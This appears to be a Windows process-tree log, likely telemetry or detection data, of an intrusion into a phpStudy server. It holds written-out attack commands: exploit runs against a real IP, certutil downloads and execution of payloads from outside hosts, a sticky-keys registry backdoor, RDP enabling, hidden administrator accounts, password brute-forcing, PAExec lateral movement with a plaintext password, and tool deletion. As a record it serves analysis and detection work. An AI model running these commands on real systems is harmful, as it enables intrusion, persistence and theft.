+        └─ cmd.exe (PID 4200): ""C:\Windows\system32\cmd.exe"  /c "python PhpStudyExp2.py http://121.36.30.176/ "whoami&arp -a&ipconfig&ping www.baidu.com -c 1"""
+      └─ cmd.exe (PID 4940): "/c del /f /q PhpStudyExp2.py "  [x2]
+      └─ powershell.exe (PID 4080): "powershell.exe -ExecutionPolicy Bypass -C "echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc""
+      └─ powershell.exe (PID 4692): "powershell.exe -ExecutionPolicy Bypass -C "echo start:dbb2f234-101f-4f44-bb97-72263635f506""
+      └─ powershell.exe (PID 3740): "powershell.exe -ExecutionPolicy Bypass -C "cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\Users\Public\agent.exe&cmd /c start /min C:\Users\Public\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"'""
+        └─ cmd.exe (PID 4572): ""C:\Windows\system32\cmd.exe"  /c "python PhpStudyExp2.py http://121.36.30.176/ "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\Users\Public\agent.exe&cmd /c start /min C:\Users\Public\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443"""
+      └─ powershell.exe (PID 3076): "powershell.exe -ExecutionPolicy Bypass -C "echo end:dbb2f234-101f-4f44-bb97-72263635f506""
+      └─ cmd.exe (PID 4632): "/c echo start:5a860809-a5ba-4924-8c54-065a8650bdc9"
+      └─ cmd.exe (PID 4320): "/c WinBrute.exe administrator_pass.txt administrator"
+        └─ WinBrute.exe (PID 3524): "WinBrute.exe  administrator_pass.txt administrator"
+      └─ cmd.exe (PID 4900): "/c del /f /q WinBrute.exe && del /f /q administrator_pass.txt"
+      └─ cmd.exe (PID 3204): "/c echo end:5a860809-a5ba-4924-8c54-065a8650bdc9"
+      └─ powershell.exe (PID 5032): "powershell.exe -ExecutionPolicy Bypass -C "echo start:b7f92752-df34-4b08-9e98-45a3004b94ff""
+      └─ powershell.exe (PID 3900): "powershell.exe -ExecutionPolicy Bypass -C "reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389;reg query \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\";REG ADD \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\windows\system32\cmd.exe\"
+        └─ reg.exe (PID 520): ""C:\Windows\system32\reg.exe"  add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+        └─ netsh.exe (PID 3276): ""C:\Windows\system32\netsh.exe"  advfirewall firewall add rule "name=Remote Desktop" dir=in action=allow protocol=TCP localport=3389"
+        └─ reg.exe (PID 4256): ""C:\Windows\system32\reg.exe"  query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server""
+        └─ reg.exe (PID 4520): ""C:\Windows\system32\reg.exe"  ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f"
+        └─ reg.exe (PID 3332): ""C:\Windows\system32\reg.exe"  query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe""  [x2]
+      └─ powershell.exe (PID 836): "powershell.exe -ExecutionPolicy Bypass -C "REG ADD \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\windows\system32\sethc.exe\" /f;REG query \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\"""
+        └─ reg.exe (PID 4608): ""C:\Windows\system32\reg.exe"  ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d C:\windows\system32\sethc.exe /f"
+      └─ powershell.exe (PID 3408): "powershell.exe -ExecutionPolicy Bypass -C "echo end:b7f92752-df34-4b08-9e98-45a3004b94ff""
+      └─ cmd.exe (PID 3464): "/c echo start:e96998eb-ab9a-4a48-979c-fb68511a6a83"
+      └─ cmd.exe (PID 4772): "/c nbtscan.exe 192.168.0.244/24"
+        └─ nbtscan.exe (PID 4976): "nbtscan.exe  192.168.0.244/24"
+      └─ cmd.exe (PID 4596): "/c del /f /q nbtscan.exe"
+      └─ cmd.exe (PID 1860): "/c echo end:e96998eb-ab9a-4a48-979c-fb68511a6a83"
+      └─ cmd.exe (PID 4196): "/c echo start:e3c59524-1c33-40e6-99c4-a2d8329d047f"
+      └─ cmd.exe (PID 2284): "/c PAExec.exe \\192.168.0.95 -u administrator -p Data123456! ipconfig"
+        └─ PAExec.exe (PID 2196): "PAExec.exe  \\192.168.0.95 -u administrator -p Data123456! ipconfig"
+              wrote → \\192.168.0.95\ADMIN$\PAExec-2196-WIN2012-1.exe
+              wrote → \\192.168.0.95\pipe\PAExec-2196-WIN2012-1.exe
+      └─ cmd.exe (PID 3720): "/c del /f /q PAExec.exe"  [x2]
+      └─ cmd.exe (PID 4604): "/c echo end:e3c59524-1c33-40e6-99c4-a2d8329d047f"
+      └─ cmd.exe (PID 2952): "/c echo start:60039041-7450-46ab-99f6-126b30b91407"
+      └─ cmd.exe (PID 3988): "/c PAExec.exe \\192.168.0.244 -u administrator -p Data123456! ipconfig"
+        └─ PAExec.exe (PID 4224): "PAExec.exe  \\192.168.0.244 -u administrator -p Data123456! ipconfig"
+              wrote → \\192.168.0.244\ADMIN$\PAExec-4224-WIN2012-1.exe
+              wrote → \\192.168.0.244\pipe\PAExec-4224-WIN2012-1.exe
+      └─ cmd.exe (PID 1760): "/c echo end:60039041-7450-46ab-99f6-126b30b91407"
+WmiPrvSE.exe (PID 4248): "C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding"  [x125]
+notepad.exe (PID 5404): ""C:\Windows\system32\NOTEPAD.EXE" D:\phpStudy\Apache\conf\httpd.conf"  [x3]
+PAExec-2196-WIN2012-1.exe (PID 2788): "C:\Windows\PAExec-2196-WIN2012-1.exe -service"
+  └─ ipconfig.exe (PID 4680): ""ipconfig""
+notepad.exe (PID 6476): ""C:\Windows\system32\NOTEPAD.EXE" D:\phpStudy\Apache\conf\extra\httpd-autoindex.conf"
+notepad.exe (PID 4616): ""C:\Windows\system32\NOTEPAD.EXE" D:\phpStudy\Apache\conf\extra\httpd-vhosts.conf"  [x2]
+WmiPrvSE.exe (PID 4804): "C:\Windows\system32\wbem\wmiprvse.exe -Embedding"  [x121]
+Taskmgr.exe (PID 1524): ""C:\Windows\system32\taskmgr.exe" /4"
+sc.exe (PID 4832): "C:\Windows\system32\sc.exe start wuauserv"  [x4]
+smss.exe (PID 3204): "\SystemRoot\System32\smss.exe 00000000 00000050 "  [x4]
+  └─ csrss.exe (PID 4400): "%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"  [x4]
+  └─ winlogon.exe (PID 3160): "winlogon.exe"  [x4]
+    └─ LogonUI.exe (PID 2916): ""LogonUI.exe" /flags:0x0"  [x4]
+    └─ dwm.exe (PID 2572): ""dwm.exe""  [x4]
+ChsIME.exe (PID 3408): "C:\Windows\System32\InputMethod\CHS\ChsIME.exe -Embedding"  [x4]
+rdpclip.exe (PID 672): "rdpclip"  [x4]
+taskhost.exe (PID 616): "taskhost.exe "  [x3]
+dllhost.exe (PID 4568): "C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}"  [x3]
+notepad.exe (PID 2300): ""C:\Windows\system32\NOTEPAD.EXE" D:\benign1.txt"
+OpenWith.exe (PID 5936): "C:\Windows\system32\OpenWith.exe -Embedding"
+notepad.exe (PID 3496): ""C:\Windows\system32\NOTEPAD.EXE" D:\phpStudy\Apache\conf\vhosts.conf"  [x2]
+notepad.exe (PID 2824): ""C:\Windows\system32\NOTEPAD.EXE" D:\phpStudy\Apache\conf\extra\httpd-php.conf"
+taskeng.exe (PID 5896): "taskeng.exe {949666CC-3484-4C39-9B3D-75B487117FA1} S-1-5-18:NT AUTHORITY\System:Service:"
+  └─ GoogleUpdate.exe (PID 5032): ""C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /ua /installsource scheduler"  [x20]
+taskeng.exe (PID 1728): "taskeng.exe {1987463F-3E30-45F6-907F-106CE21D2A4E} S-1-5-18:NT AUTHORITY\System:Service:"
+ceipdata.exe (PID 6204): "C:\Windows\system32\ceipdata.exe -id 1"
+taskeng.exe (PID 2904): "taskeng.exe {1725C1CB-45F9-4127-9216-55718C138811} S-1-5-18:NT AUTHORITY\System:Service:"
+GoogleUpdate.exe (PID 4876): ""C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc"  [x4]
+      connected to → 120.253.255.162:443
+taskhost.exe (PID 4088): "taskhost.exe USER"  [x10]
+wsqmcons.exe (PID 3944): "C:\Windows\System32\wsqmcons.exe "
+  └─ schtasks.exe (PID 5196): "C:\Windows\system32\schtasks.exe /delete /f /TN "Microsoft\Windows\Customer Experience Improvement Program\Uploader""
+taskeng.exe (PID 6436): "taskeng.exe {00F1F778-EB9F-4384-8B08-4E0EEFD714EE} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 2984): "taskeng.exe {F2D7AC85-B74B-4E4D-9D8E-9FA3028440F3} S-1-5-18:NT AUTHORITY\System:Service:"
+taskhost.exe (PID 3248): "taskhost.exe SYSTEM"  [x3]
+taskhostex.exe (PID 6404): "taskhostex.exe "
+taskeng.exe (PID 2608): "taskeng.exe {95C1BBC5-073C-40F8-853D-741CC062E408} S-1-5-18:NT AUTHORITY\System:Service:"
+diagtrackrunner.exe (PID 3228): "C:\Windows\system32\compattel\DiagTrackRunner.exe /UploadEtlFilesOnly"
+CompatTelRunner.exe (PID 6844): "C:\Windows\system32\CompatTelRunner.exe "
+taskeng.exe (PID 1708): "taskeng.exe {06F0285C-6AE1-4263-8374-C2E7167F956A} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 6432): "taskeng.exe {06082130-0AC6-4708-8683-AC94E0DD72F5} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 3404): "taskeng.exe {0876C587-EB5C-4DEA-B483-8A7C723C914A} S-1-5-18:NT AUTHORITY\System:Service:"
+taskhostex.exe (PID 5652): "taskhostex.exe Regular"
+aitagent.exe (PID 4596): "C:\Windows\system32\aitagent.EXE /increment"
+taskhost.exe (PID 6740): "taskhost.exe /RuntimeWide"
+  └─ ngentask.exe (PID 5408): ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe" /RuntimeWide /StopEvent:436"
+    └─ ngen.exe (PID 7116): ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe" RemoveTaskDelayStartTrigger /LegacyServiceBehavior"
+    └─ ngen.exe (PID 1728): ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe" ExecuteQueuedItems /LegacyServiceBehavior"
+  └─ ngentask.exe (PID 7104): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe" /RuntimeWide /StopEvent:280"
+    └─ ngen.exe (PID 1684): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe" RemoveTaskDelayStartTrigger /LegacyServiceBehavior"
+    └─ ngen.exe (PID 5944): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe" ExecuteQueuedItems /LegacyServiceBehavior"
+CompatTelRunner.exe (PID 6724): "C:\Windows\system32\CompatTelRunner.exe -maintenance"
+wermgr.exe (PID 7020): "C:\Windows\system32\wermgr.exe -queuereporting"
+MRT.exe (PID 3048): "C:\Windows\system32\MRT.exe /EHB /Q"
+      wrote → C:\Windows\Temp\DA269804-8F67-A661-601D-5A653EE7E4CD\MPGEAR.DLL
+      wrote → C:\Windows\Temp\DA269804-8F67-A661-601D-5A653EE7E4CD\MPENGINE.DLL
+svchost.exe (PID 3528): "C:\Windows\System32\svchost.exe -k WerSvcGroup"
+  └─ WerFault.exe (PID 6596): ""C:\Windows\system32\WerFault.exe" -k -lcq"
+lpremove.exe (PID 1244): "C:\Windows\system32\lpremove.exe "
+taskeng.exe (PID 7024): "taskeng.exe {947D8B3D-8256-4A75-9295-ACB07496BF88} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 3468): "taskeng.exe {E3FCD572-636A-4269-9567-F8E8668F0C37} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 4644): "taskeng.exe {51A848AA-1133-4A5B-8232-1FBF794FAC45} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 5336): "taskeng.exe {A5506531-9904-4999-9CD0-51627FDE34E5} S-1-5-18:NT AUTHORITY\System:Service:"
+cmd.exe (PID 1488): "cmd.exe /c "cmd /c "cd /d "D:/phpStudy/WWW"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]" 2>&1""
+  └─ cmd.exe (PID 6660): "cmd  /c "cd /d "D:/phpStudy/WWW"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]" "
+    └─ net.exe (PID 7036): "net  user nbb nb123. /add"
+      └─ net1.exe (PID 3620): "C:\Windows\system32\net1  user nbb nb123. /add"
+    └─ net.exe (PID 5292): "net  localgroup administrators nbb /add"
+      └─ net1.exe (PID 6268): "C:\Windows\system32\net1  localgroup administrators nbb /add"
+cmd.exe (PID 4416): "cmd.exe /c "cmd /c "cd /d "D:/phpStudy/WWW"&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\Windows\ywm.exe&echo [S]&cd&echo [E]" 2>&1""
+  └─ cmd.exe (PID 932): "cmd  /c "cd /d "D:/phpStudy/WWW"&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\Windows\ywm.exe&echo [S]&cd&echo [E]" "
+    └─ certutil.exe (PID 3840): "certutil.exe  -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\Windows\ywm.exe"
+          connected to → 111.229.170.12:80
+          wrote → C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\IE\servert[1].exe
+          wrote → C:\Windows\ywm.exe
+cmd.exe (PID 7084): "cmd.exe /c "cmd /c "cd /d "D:/phpStudy/WWW"&C:\Windows\ywm.exe&echo [S]&cd&echo [E]" 2>&1""
+  └─ cmd.exe (PID 6880): "cmd  /c "cd /d "D:/phpStudy/WWW"&C:\Windows\ywm.exe&echo [S]&cd&echo [E]" "
+    └─ ywm.exe (PID 3636): "C:\Windows\ywm.exe"
+          wrote → C:\Windows\svchost.exe
+svchost.exe (PID 4920): "C:\Windows\svchost.exe"
+  └─ svchost.exe (PID 2616): "C:\Windows\svchost.exe Win7"
+taskeng.exe (PID 6980): "taskeng.exe {C821D1FD-90E5-4B83-927F-8CB86D8B0D6A} S-1-5-18:NT AUTHORITY\System:Service:"
+cmd.exe (PID 5736): "cmd.exe /c "cmd /c "cd /d "D:/phpStudy/WWW"&wmic cpu get NumberOfLogicalProcessors&echo [S]&cd&echo [E]" 2>&1""
+  └─ cmd.exe (PID 4560): "cmd  /c "cd /d "D:/phpStudy/WWW"&wmic cpu get NumberOfLogicalProcessors&echo [S]&cd&echo [E]" "
+    └─ WMIC.exe (PID 6428): "wmic  cpu get NumberOfLogicalProcessors"  [x2]
+cmd.exe (PID 3352): "cmd.exe /c "cmd /c "cd /d "D:/phpStudy/WWW"&systeminfo|find "�����ڴ�����"&echo [S]&cd&echo [E]" 2>&1""
+  └─ cmd.exe (PID 5436): "cmd  /c "cd /d "D:/phpStudy/WWW"&systeminfo|find "�����ڴ�����"&echo [S]&cd&echo [E]" "
+    └─ systeminfo.exe (PID 4320): "systeminfo"
+    └─ find.exe (PID 1796): "find  "�����ڴ�����""
+WmiPrvSE.exe (PID 5856): "C:\Windows\sysWOW64\wbem\wmiprvse.exe -secured -Embedding"
+TrustedInstaller.exe (PID 3752): "C:\Windows\servicing\TrustedInstaller.exe"  [x2]
+TiWorker.exe (PID 1144): "C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_6.3.9600.19724_none_fa5e641b9b111ab1\TiWorker.exe -Embedding"  [x2]
+cmd.exe (PID 6640): "cmd.exe /c "cmd /c "cd /d "D:/phpStudy/WWW"&tasklist /svc | findstr TermService&echo [S]&cd&echo [E]" 2>&1""
+  └─ cmd.exe (PID 7156): "cmd  /c "cd /d "D:/phpStudy/WWW"&tasklist /svc | findstr TermService&echo [S]&cd&echo [E]" "
+    └─ tasklist.exe (PID 3556): "tasklist  /svc "  [x2]
+    └─ findstr.exe (PID 5300): "findstr  TermService"
+cmd.exe (PID 6276): "cmd.exe /c "cmd /c "cd /d "D:/phpStudy/WWW"&netstat -ano | findstr 88&echo [S]&cd&echo [E]" 2>&1""
+  └─ cmd.exe (PID 6632): "cmd  /c "cd /d "D:/phpStudy/WWW"&netstat -ano | findstr 88&echo [S]&cd&echo [E]" "
+    └─ NETSTAT.EXE (PID 2092): "netstat  -ano "  [x2]
+    └─ findstr.exe (PID 6284): "findstr  88"
+cmd.exe (PID 5084): "cmd.exe /c cmd /c "cd /d D:/phpStudy/WWW/&net user oop o33 /add&echo [S]" 2>&1"
+  └─ cmd.exe (PID 6764): "cmd  /c "cd /d D:/phpStudy/WWW/&net user oop o33 /add&echo [S]" "
+    └─ net.exe (PID 2096): "net  user oop o33 /add"
+      └─ net1.exe (PID 3284): "C:\Windows\system32\net1  user oop o33 /add"
+cmd.exe (PID 6244): "cmd.exe /c cmd /c "cd /d D:/phpStudy/WWW/&tasklist /svc | find "Ter"&echo [S]" 2>&1"
+  └─ cmd.exe (PID 6204): "cmd  /c "cd /d D:/phpStudy/WWW/&tasklist /svc | find "Ter"&echo [S]" "
+    └─ find.exe (PID 924): "find  "Ter""
+cmd.exe (PID 1324): "cmd.exe /c cmd /c "cd /d D:/phpStudy/WWW/&netstat -ano | find "88"&echo [S]" 2>&1"
+  └─ cmd.exe (PID 1444): "cmd  /c "cd /d D:/phpStudy/WWW/&netstat -ano | find "88"&echo [S]" "
+    └─ find.exe (PID 5080): "find  "88""
+cmd.exe (PID 1144): "cmd.exe /c cmd /c "cd /d D:/phpStudy/WWW/&wmic cpu get NumberOfLogicalProcessors&echo [S]" 2>&1"
+  └─ cmd.exe (PID 6680): "cmd  /c "cd /d D:/phpStudy/WWW/&wmic cpu get NumberOfLogicalProcessors&echo [S]" "
+cmd.exe (PID 288): "cmd.exe /c cmd /c "cd /d D:/phpStudy/WWW/&wmic memorychip get capacity&echo [S]" 2>&1"
+  └─ cmd.exe (PID 704): "cmd  /c "cd /d D:/phpStudy/WWW/&wmic memorychip get capacity&echo [S]" "
+    └─ WMIC.exe (PID 4252): "wmic  memorychip get capacity"
+taskeng.exe (PID 3404): "taskeng.exe {B300FFC9-41D6-4406-9D68-94CE8940D12B} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 4876): "taskeng.exe {E036329C-2064-40C8-8255-3F0D4E953978} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 2096): "taskeng.exe {BAE09C72-3969-454B-8D72-08ADA3182BC5} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 7068): "taskeng.exe {AB1C3E24-AE01-4749-8250-20BDB318AF39} S-1-5-18:NT AUTHORITY\System:Service:"
+sppsvc.exe (PID 924): "C:\Windows\system32\sppsvc.exe"
+taskeng.exe (PID 5356): "taskeng.exe {BAA0B28C-6372-420E-8067-FA0741C99413} S-1-5-18:NT AUTHORITY\System:Service:"
+taskeng.exe (PID 2752): "taskeng.exe {AD1090F2-00DA-4D81-9D76-4E76BD666B6D} S-1-5-18:NT AUTHORITY\System:Service:"
+notepad.exe (PID 1132): ""C:\Windows\system32\NOTEPAD.EXE" D:\README.txt"  [x2]
